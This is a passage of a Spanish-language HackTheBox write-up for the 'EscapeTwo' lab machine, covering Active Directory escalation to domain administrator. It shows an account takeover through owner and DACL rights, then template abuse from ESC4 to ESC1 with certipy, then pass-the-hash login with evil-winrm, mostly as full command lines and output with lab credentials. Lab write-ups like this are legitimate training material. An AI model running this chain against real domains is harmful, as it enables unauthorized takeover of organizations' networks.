┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.69.138 set owner "ca_svc" "ryan"
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
```

Ahora que soy dueño puedo otorgarme el control total de la cuenta con `impacket-dacledit`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20260121-182014.bak
[*] DACL modified successfully!
```

Teniendo el control total de la cuenta puedo cambiarle su contraseña para tener acceso con `net rpc`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ net rpc password "ca_svc" "w0nder11ng23@" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S 10.129.69.138
```

Al probar las credenciales puedo comprobar que si funciono: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nxc smb sequel.htb -u ca_svc -p 'w0nder11ng23@'
SMB         10.129.69.138   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.69.138   445    DC01             [+] sequel.htb\ca_svc:w0nder11ng23@
```

### Abusando de ESC4.

Ahora que tengo **control total sobre la cuenta**, uno de los primeros pasos que realizo es **enumerar las plantillas de certificados que el usuario puede solicitar**, con el objetivo de identificar posibles vectores de escalada de privilegios. Esto lo puedo hacer con `certipy`: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ certipy find -u ca_svc@sequel.htb -p 'w0nder11ng23@' -dc-ip 10.129.69.138 -stdout -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'
[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-01-21T18:21:31+00:00
    Template Last Modified              : 2026-01-21T18:21:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

- Podemos ver que la plantilla DunderMifflinAuthentication es vulnerable a ESC4.

!!! info
    **ESC4 (Template Hijacking)** es una vulnerabilidad que ocurre cuando un atacante posee permisos para **modificar una plantilla de certificados en AD CS**.
Esto le permite **alterar la configuración de una plantilla legítima** para introducir condiciones inseguras, haciéndola vulnerable a otros tipos de abuso, como **ESC1**.

Podemos modificar la plantilla DunderMifflinAuthentication para que sea vulnerable a ESC1 con `certipy` de la siguiente manera:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ certipy template \
    -u 'ca_svc@sequel.htb' -p 'w0nder11ng23@' \
    -dc-ip '10.129.69.138' -template 'DunderMifflinAuthentication' \
    -write-default-configuration
    
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'DunderMifflinAuthentication.json'
[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
```

!!! info
    **ESC1** es una vulnerabilidad que permite solicitar un certificado **en nombre de cualquier usuario**, siempre que la plantilla permita **especificar el Subject Alternative Name (SAN)**.

Ahora que la plantilla es vulnerable a ESC1 podemos solicitar un certificado para el usuario administrador.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ certipy req -u ca_svc@sequel.htb -p 'w0nder11ng23@' -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.16.34 -debug

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '10.10.16.34'
[+] DC IP: None
[+] DC Host: 'SEQUEL.HTB'
[+] Target IP: None
[+] Remote Name: 'SEQUEL.HTB'
[+] Domain: 'SEQUEL.HTB'
[+] Username: 'CA_SVC'
[+] Trying to resolve 'SEQUEL.HTB' at '10.10.16.34'
[+] Resolved 'SEQUEL.HTB' from cache: 10.129.69.138
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.69.138[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.69.138[\pipe\cert]
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Con el certificado puedo autenticarme como administrador y obtener su hash NTLM. 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.69.138
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

Y con este hash puedo conectarme via WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ evil-winrm -i sequel.htb -u administrator -H "7a8d4e04986afa8ed4060f75e5a0b3ff"


*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
3d7e4611a971c4750e******
```

***PWNED***

![](assets/Pasted%20image%2020260122115707.png)